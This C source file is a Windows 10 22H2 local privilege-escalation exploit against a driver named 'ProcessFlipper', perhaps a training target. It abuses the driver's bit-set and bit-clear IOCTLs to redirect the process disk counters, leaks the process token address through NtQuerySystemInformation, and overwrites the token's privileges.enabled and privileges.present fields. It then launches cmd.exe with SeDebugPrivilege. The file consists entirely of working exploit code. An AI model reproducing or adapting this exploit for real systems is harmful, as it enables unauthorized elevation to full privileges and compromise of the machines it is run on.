#include <Windows.h>
#include <stdio.h>

#define ProcessFlipper "\\\\.\\ProcessFlipper"

#define IOCTL_PROCESS_SET 0x222004
#define IOCTL_PROCESS_CLEAR 0x222008

#define tokenoffset  0x4b8				 //windows 10 22H2
#define diskCounterOffset  0x8b8        // windows 10 22H2

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemProcessInformation = 5,
} SYSTEM_INFORMATION_CLASS;

typedef LONG KPRIORITY;
typedef LONG KTHREAD_STATE;
typedef LONG KWAIT_REASON;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _SYSTEM_THREAD_INFORMATION
{
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    ULONG_PTR StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitches;
    KTHREAD_STATE ThreadState;
    KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _PROCESS_DISK_COUNTERS
{
    ULONGLONG BytesRead;
    ULONGLONG BytesWritten;
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG FlushOperationCount;
} PROCESS_DISK_COUNTERS, * PPROCESS_DISK_COUNTERS;

//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/process.htm?tx=177&ts=0,1588&tw=564px
typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize; 
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark; 
    ULONGLONG CycleTime; 
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey; 
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(*tNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
tNtQuerySystemInformation NtQuerySystemInformation;

bool priv(HANDLE file, ULONG_PTR value)
{
    for (int i = 0; i < 64; i++)
    {
        ULONG BitToFlip = diskCounterOffset * 8 + i;
        ULONG BytesReturned;
        DWORD ioctlcode = (((ULONG_PTR)value >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR;
        if (!DeviceIoControl(file, ioctlcode, &BitToFlip, sizeof(BitToFlip), NULL, 0, &BytesReturned, NULL)) {
            printf("[priv] [%d] DeviceIoControlCode failed (0x%08X)\n", i, GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}


bool patch_diskcounter(HANDLE file)
{
	ULONG value = tokenoffset + 0x80 - 0x8;     // add 0x80 to point to token and subtract to get pointed by BytesWritten 

	for (int i = 0; i < 12; i++)
	{
		ULONG BitToFlip = diskCounterOffset * 8 + i;     // bits needed 
		ULONG BytesReturned;

		DWORD ioctlcode = (((ULONG_PTR)value >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR ;
		if (!DeviceIoControl(file, ioctlcode, &BitToFlip, sizeof(BitToFlip), NULL, 0, &BytesReturned, NULL)) {
			printf("[patch_diskcounter] [%d] DeviceIoControlCode failed (0x%08X)\n", i, GetLastError());
			return FALSE;
		}
	}

	return TRUE;
}

ULONG_PTR leak()
{
    ULONG returnlength = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &returnlength);
    SYSTEM_PROCESS_INFORMATION* procinfo = (SYSTEM_PROCESS_INFORMATION*)calloc(5, returnlength);
    status = NtQuerySystemInformation(SystemProcessInformation, procinfo, returnlength, &returnlength);

    //printf("[Leak] SystemProcessInformation %p %x\n", procinfo, returnlength);

    ULONG_PTR ret = 0;

    while (1)
    {
        /*
        * --------->SYSTEM_PROCESS_INFORMATION
        *           SYSTEM_THREAD_INFORMATION[no of threads]
        *           PROCESS_DISK_COUNTERS DiskCounter
        */
        PROCESS_DISK_COUNTERS* Counters = (PROCESS_DISK_COUNTERS*)((char*)procinfo + sizeof(SYSTEM_PROCESS_INFORMATION) + sizeof(SYSTEM_THREAD_INFORMATION)* procinfo->NumberOfThreads);
        
        if (procinfo->UniqueProcessId == (HANDLE)GetCurrentProcessId())
        {
            ret = Counters->BytesWritten;
        }

        if (procinfo->NextEntryOffset == 0)
        {
            break;
        }

        procinfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)procinfo + procinfo->NextEntryOffset);
    }

    return ret;
}

int main()
{

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    NtQuerySystemInformation = (tNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	HANDLE file = CreateFileA(ProcessFlipper, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("[CreateFileA] failed to open handle to processflipper (0x%08X)\n", GetLastError());
		return EXIT_FAILURE;
	}
	else {
		printf("[+] ProcessFlipper handle : 0x%08X\n", (INT)file);
	}

    HANDLE tmpfile = CreateFileA("tmp.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_NO_BUFFERING, NULL);
    if (tmpfile == INVALID_HANDLE_VALUE)
    {
        printf("[CreateFileA] failed to create tmp.txt (0x%08X)\n", GetLastError());
        return EXIT_FAILURE;
    }

    static char tmp[0x100000];
    DWORD tmp1;

	printf("[+] Overwriting DiskCounters\n");
    //DebugBreak();
    patch_diskcounter(file);

    ULONG_PTR token = leak() & ~0xf ;    // mask the refCount
    printf("[+] Current Process token = 0x%I64x\n", token);

    //DebugBreak();
    printf("[+] Overwriting privileges.enabled\n");
    priv(file, token + 0x40);  // overwrite privileges.enabled
    WriteFile(tmpfile, tmp, 0x100000, &tmp1, NULL);
    
    printf("[+] Overwriting privileges.present\n");
    priv(file, token + 0x40 - 0x8); // overwrite privileges.present
    WriteFile(tmpfile, tmp, 0x100000, &tmp1, NULL);

    //DebugBreak();
    printf("[+] Spawning cmd.exe with SeDebugPrivilege\n");
    system("cmd.exe");
    return 0;
}